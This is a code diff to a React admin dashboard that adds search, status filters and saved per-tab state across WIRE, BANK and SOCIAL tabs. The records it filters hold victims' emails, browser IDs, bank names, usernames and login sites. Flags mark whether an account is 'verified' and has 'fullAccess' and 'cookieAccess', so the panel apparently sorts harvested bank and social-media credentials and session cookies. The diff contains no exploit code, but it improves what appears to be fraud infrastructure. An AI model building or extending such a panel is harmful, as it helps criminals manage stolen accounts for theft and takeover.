@@ -1,9 +1,10 @@
 "use client";
 
-import { useState, useMemo, useEffect } from 'react';
+import { useState, useMemo, useEffect, useCallback } from 'react';
 import Link from 'next/link';
 import { useAppState } from '../context/AppContext';
 import { DashboardTabs } from '../components/admin/dashboard/DashboardTabs';
+import { DashboardFilterBar, type StatusFilter } from '../components/admin/dashboard/DashboardFilterBar';
 import { ItemDetailsModal } from '../components/admin/dashboard/ItemDetailsModal';
 import { Pagination } from '../components/admin/dashboard/Pagination';
 import { WireTable } from '../components/admin/dashboard/wire/WireTable';
@@ -11,24 +12,106 @@ import { BankTable } from '../components/admin/dashboard/bank/BankTable';
 import { SocialTable } from '../components/admin/dashboard/social/SocialTable';
 import LoadingSpinner from '../components/LoadingSpinner';
 import { authApi } from '../../utils/auth';
+import { usePersistedState } from '../hooks/usePersistedState';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
-import { faSync, faChartLine, faDownload } from '@fortawesome/free-solid-svg-icons';
+import { faSync, faChartLine, faDownload, faSearch } from '@fortawesome/free-solid-svg-icons';
+
+interface TabFilterState {
+  search: string;
+  status: StatusFilter;
+  page: number;
+}
+
+interface DashboardPersistedState {
+  activeCategory: 'WIRE' | 'BANK' | 'SOCIAL' | null;
+  tabs: Record<'WIRE' | 'BANK' | 'SOCIAL', TabFilterState>;
+}
+
+const STORAGE_KEY = 'webfixx_dashboard_state_v1';
+const DEFAULT_TAB_STATE: TabFilterState = { search: '', status: 'ALL', page: 1 };
+const DEFAULT_DASH_STATE: DashboardPersistedState = {
+  activeCategory: null,
+  tabs: {
+    WIRE: { ...DEFAULT_TAB_STATE },
+    BANK: { ...DEFAULT_TAB_STATE },
+    SOCIAL: { ...DEFAULT_TAB_STATE },
+  },
+};
 
 export default function Dashboard() {
   const { appData, setAppData } = useAppState(); // Destructure setAppData
   const [loading, setLoading] = useState(false);
   const [refreshing, setRefreshing] = useState(false); // New state for refresh
   const [selectedItem, setSelectedItem] = useState<string | null>(null);
-  const [activeCategory, setActiveCategory] = useState<'WIRE' | 'BANK' | 'SOCIAL' | null>(null);
   const [memoInput, setMemoInput] = useState<{ id: string; text: string } | null>(null);
-  const [currentPage, setCurrentPage] = useState(1);
   const [dismissDownload, setDismissDownload] = useState(false);
   const ITEMS_PER_PAGE = 25;
 
-  // Reset to page 1 when category changes
-  useEffect(() => {
-    setCurrentPage(1);
-  }, [activeCategory]);
+  // Persisted dashboard state (search, filters, page per tab) in localStorage
+  const [dashState, setDashState] = usePersistedState<DashboardPersistedState>(STORAGE_KEY, DEFAULT_DASH_STATE);
+
+  const activeCategory = dashState.activeCategory;
+  const tabState = activeCategory ? (dashState.tabs?.[activeCategory] || DEFAULT_TAB_STATE) : DEFAULT_TAB_STATE;
+  const searchQuery = tabState.search;
+  const statusFilter = tabState.status;
+  const currentPage = tabState.page;
+
+  const setActiveCategory = useCallback((category: 'WIRE' | 'BANK' | 'SOCIAL') => {
+    setDashState(prev => ({ ...prev, activeCategory: category }));
+  }, [setDashState]);
+
+  const setSearchQuery = useCallback((value: string) => {
+    setDashState(prev => {
+      if (!prev.activeCategory) return prev;
+      return {
+        ...prev,
+        tabs: {
+          ...prev.tabs,
+          [prev.activeCategory]: { ...DEFAULT_TAB_STATE, ...prev.tabs?.[prev.activeCategory], search: value, page: 1 },
+        },
+      };
+    });
+  }, [setDashState]);
+
+  const setStatusFilter = useCallback((value: StatusFilter) => {
+    setDashState(prev => {
+      if (!prev.activeCategory) return prev;
+      return {
+        ...prev,
+        tabs: {
+          ...prev.tabs,
+          [prev.activeCategory]: { ...DEFAULT_TAB_STATE, ...prev.tabs?.[prev.activeCategory], status: value, page: 1 },
+        },
+      };
+    });
+  }, [setDashState]);
+
+  const setCurrentPage = useCallback((page: number) => {
+    setDashState(prev => {
+      if (!prev.activeCategory) return prev;
+      return {
+        ...prev,
+        tabs: {
+          ...prev.tabs,
+          [prev.activeCategory]: { ...DEFAULT_TAB_STATE, ...prev.tabs?.[prev.activeCategory], page },
+        },
+      };
+    });
+  }, [setDashState]);
+
+  const clearFilters = useCallback(() => {
+    setDashState(prev => {
+      if (!prev.activeCategory) return prev;
+      return {
+        ...prev,
+        tabs: {
+          ...prev.tabs,
+          [prev.activeCategory]: { search: '', status: 'ALL', page: 1 },
+        },
+      };
+    });
+  }, [setDashState]);
+
 
   // Transform hub data from array format to object format
   const hubData = useMemo(() => {
@@ -90,12 +173,84 @@ export default function Dashboard() {
     );
   }, [categorizedData]);
 
-  // Set initial active category if not set
+  // Set initial active category if not set, or fall back if the persisted tab has no data
   useEffect(() => {
-    if (!activeCategory && availableCategories.length > 0) {
+    if (availableCategories.length === 0) return;
+    if (!activeCategory || !availableCategories.includes(activeCategory)) {
       setActiveCategory(availableCategories[0] as 'WIRE' | 'BANK' | 'SOCIAL');
     }
-  }, [availableCategories, activeCategory]);
+  }, [availableCategories, activeCategory, setActiveCategory]);
+
+  const parseList = (value: any): any[] => {
+    if (Array.isArray(value)) return value;
+    if (typeof value === 'string') {
+      try {
+        const parsed = JSON.parse(value);
+        return Array.isArray(parsed) ? parsed : [];
+      } catch {
+        return [];
+      }
+    }
+    return [];
+  };
+
+  const matchesStatus = (item: any, status: StatusFilter): boolean => {
+    const verified = item.verified === 'TRUE';
+    switch (status) {
+      case 'VERIFIED':
+        return verified;
+      case 'UNVERIFIED':
+        return !verified;
+      case 'FULL_ACCESS':
+        return verified && item.fullAccess === 'TRUE' && item.cookieAccess === 'TRUE';
+      default:
+        return true;
+    }
+  };
+
+  const itemSearchText = (item: any, category: 'WIRE' | 'BANK' | 'SOCIAL'): string => {
+    const parts: string[] = [];
+    const push = (value: any) => {
+      if (value !== null && value !== undefined) parts.push(String(value).toLowerCase());
+    };
+    push(item.email);
+    push(item.domain);
+    push(item.id);
+    push(item.browserId);
+    push(item.submissionId);
+    push(item.title);
+    push(item.memo);
+    if (item.timestamp) parts.push(new Date(item.timestamp).toLocaleString().toLowerCase());
+    if (category === 'BANK') {
+      parseList(item.banks).forEach((bank: any) => {
+        push(bank.bankName);
+        push(bank.username);
+        push(bank.website);
+      });
+    } else if (category === 'SOCIAL') {
+      parseList(item.socials).forEach((social: any) => {
+        push(social.platform);
+        push(social.username);
+        push(social.website);
+      });
+    }
+    return parts.join(' ');
+  };
+
+  // Apply status filter + text search for the active tab
+  const filteredRows = useMemo(() => {
+    if (!activeCategory) return [];
+    const rows = categorizedData[activeCategory] || [];
+    const q = searchQuery.trim().toLowerCase();
+    return rows.filter((item: any) => {
+      if (statusFilter !== 'ALL' && !matchesStatus(item, statusFilter)) return false;
+      if (!q) return true;
+      return itemSearchText(item, activeCategory).includes(q);
+    });
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [categorizedData, activeCategory, searchQuery, statusFilter]);
+
+  const noFilteredResults = !!activeCategory && (categorizedData[activeCategory]?.length || 0) > 0 && filteredRows.length === 0;
 
   const handleRefreshData = async () => {
     setRefreshing(true);
@@ -199,9 +354,10 @@ export default function Dashboard() {
   const renderTable = () => {
     if (!activeCategory) return null;
 
-    const allRows = categorizedData[activeCategory] || [];
-    const totalPages = Math.ceil(allRows.length / ITEMS_PER_PAGE);
-    const startIdx = (currentPage - 1) * ITEMS_PER_PAGE;
+    const allRows = filteredRows;
+    const totalPages = Math.max(1, Math.ceil(allRows.length / ITEMS_PER_PAGE));
+    const safePage = Math.min(currentPage, totalPages);
+    const startIdx = (safePage - 1) * ITEMS_PER_PAGE;
     const paginatedData = allRows.slice(startIdx, startIdx + ITEMS_PER_PAGE);
 
     const commonProps = {
@@ -316,7 +472,31 @@ export default function Dashboard() {
           />
 
           <div className="mt-6">
-            {renderTable()}
+            <DashboardFilterBar
+              search={searchQuery}
+              onSearchChange={setSearchQuery}
+              statusFilter={statusFilter}
+              onStatusChange={setStatusFilter}
+              resultCount={filteredRows.length}
+              totalCount={categorizedData[activeCategory as 'WIRE' | 'BANK' | 'SOCIAL']?.length || 0}
+              onClear={clearFilters}
+            />
+
+            {noFilteredResults ? (
+              <div className="flex flex-col items-center justify-center py-16 text-center bg-white dark:bg-gray-800 rounded-lg border dark:border-gray-700">
+                <FontAwesomeIcon icon={faSearch} className="w-10 h-10 text-gray-400 mb-4" />
+                <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">No results match your filters</h3>
+                <p className="text-sm text-gray-600 dark:text-gray-400 mb-6">Try a different search term or clear your filters.</p>
+                <button
+                  onClick={clearFilters}
+                  className="text-sm text-blue-600 dark:text-blue-400 hover:underline"
+                >
+                  Clear filters
+                </button>
+              </div>
+            ) : (
+              renderTable()
+            )}
           </div>
 
           <ItemDetailsModal
